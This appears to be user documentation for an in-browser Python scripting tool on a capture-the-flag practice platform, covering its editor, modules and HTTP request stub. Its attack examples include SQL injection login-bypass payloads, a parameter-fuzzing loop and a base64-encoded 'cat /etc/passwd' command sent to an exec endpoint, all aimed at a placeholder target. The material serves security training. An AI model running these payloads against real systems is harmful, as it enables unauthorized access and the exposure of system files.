# Python Scripting Tool

## Code Editor Interface

The Code Editor panel provides a complete Python 3 editing and execution environment, powered by **Pyodide** (CPython ported to WebAssembly), running entirely inside the browser.

Interface regions:

| Region | Description |
|---|---|
| Code editing area | Main area for typing Python scripts, with syntax highlighting and auto-indent |
| Execution output area | Shows `print()` output, error messages, and execution status |
| Toolbar | Contains buttons for run, save, load, and clear output |
| Status bar | Shows the Pyodide initialization state (loading / ready) |

> **Note**: The Run button is disabled until Pyodide finishes initializing. Scripts can only be executed once the status bar shows "ready".

## Available Modules

### Pyodide Standard Library

The following modules can be `import`ed directly with no installation required:

| Module | Description | Typical use |
|---|---|---|
| `json` | JSON parsing and serialization | Parse API responses, build JSON payloads |
| `re` | Regular expressions | Extract flags from responses, filter specific strings |
| `base64` | Base64 encoding and decoding | Decode tokens, encode payloads |
| `hashlib` | Hash functions (MD5, SHA-1, SHA-256, etc.) | Compute hashes, verify integrity |
| `urllib.parse` | URL encoding and parsing | Build query strings, URL encode/decode |
| `html` | HTML escape handling | Decode HTML entities |
| `itertools` | Iteration utilities | Brute-force combination enumeration |
| `string` | String constants | Obtain alphabet and digit character sets |

### requests stub (platform-specific module)

The platform provides a `requests`-compatible layer so you can use familiar syntax to send HTTP requests to challenge targets:

| Function | Description |
|---|---|
| `requests.get(url, params, headers, allow_redirects)` | Send a GET request |
| `requests.post(url, data, json, headers)` | Send a POST request |

The response object exposes the following attributes:

| Attribute | Type | Description |
|---|---|---|
| `.status_code` | `int` | HTTP status code |
| `.text` | `str` | Response body as a string |
| `.json()` | `dict` / `list` | Parse the response body as JSON |
| `.headers` | `dict` | Response headers |
| `.url` | `str` | The actual URL that was requested |

## Using requests

### GET Requests

```python
import requests

# Basic GET request
response = requests.get("http://target.local/api/user?id=1")
print(response.status_code)
print(response.text)

# GET request with query parameters
params = {"id": "1", "debug": "true"}
response = requests.get("http://target.local/api/user", params=params)
print(response.url)   # Shows the full URL (including query string)
print(response.text)

# GET request with custom headers
headers = {
    "Cookie": "session=abc123",
    "X-Forwarded-For": "127.0.0.1"
}
response = requests.get("http://target.local/admin", headers=headers)
print(response.status_code)
print(response.text)
```

### POST Requests

```python
import requests

# Form POST request (application/x-www-form-urlencoded)
data = {"username": "admin", "password": "password123"}
response = requests.post("http://target.local/login", data=data)
print(response.status_code)
print(response.text)

# JSON POST request (application/json)
payload = {"query": "SELECT * FROM users"}
response = requests.post("http://target.local/api/query", json=payload)
print(response.json())

# POST request with headers
headers = {"Content-Type": "application/json", "Authorization": "Bearer token123"}
response = requests.post(
    "http://target.local/api/admin",
    json={"action": "list_users"},
    headers=headers
)
print(response.text)
```

## Attack Script Examples

### SQL Injection Testing

The following example shows how to automate testing a login form for SQL Injection vulnerabilities:

```python
import requests

BASE_URL = "http://target.local/login"

# Common SQL Injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
]

for payload in payloads:
    data = {"username": payload, "password": "anything"}
    response = requests.post(BASE_URL, data=data)

    # Check whether the login succeeded
    if "Welcome" in response.text or "flag" in response.text.lower():
        print(f"[!] Payload succeeded: {payload}")
        print(f"    Response: {response.text[:200]}")
    else:
        print(f"[-] Failed: {payload}")
```

### Parameter Fuzzing

```python
import requests
import re

BASE_URL = "http://target.local/page"

# Fuzz the range of the id parameter
for i in range(1, 20):
    response = requests.get(BASE_URL, params={"id": i})

    # Search the response for a flag pattern
    match = re.search(r"flag\{[^}]+\}", response.text)
    if match:
        print(f"[!] Flag found! id={i}: {match.group()}")
        break
    else:
        print(f"    id={i}: {response.status_code} - {len(response.text)} bytes")
```

### Base64-encoded Payload

```python
import requests
import base64

BASE_URL = "http://target.local/exec"

# Build a Base64-encoded command
command = "cat /etc/passwd"
encoded = base64.b64encode(command.encode()).decode()

response = requests.get(BASE_URL, params={"cmd": encoded})
print(response.text)
```

## Keyboard Shortcuts

| Shortcut | Action |
|---|---|
| `Cmd + Enter` (macOS) / `Ctrl + Enter` (Windows/Linux) | Run the current script |
| `Cmd + S` / `Ctrl + S` | Save the script to IndexedDB |
| `Tab` | Insert indentation (4 spaces) |

## Saving and Loading Scripts

The Code Editor can save scripts to the browser's **IndexedDB**, which makes it easy to reuse common scripts across different challenges.

### Saving a Script

Click the "Save" button on the toolbar, or press `Cmd/Ctrl + S`, then enter a script name and confirm to store it.

### Loading a Script

Click the "Load" button on the toolbar, choose a script from the saved list, and the editor contents will be replaced with the selected script.

> **Note**: Script data is stored locally in the browser's IndexedDB and will be removed when site data is cleared. Back up important scripts to a local text editor.
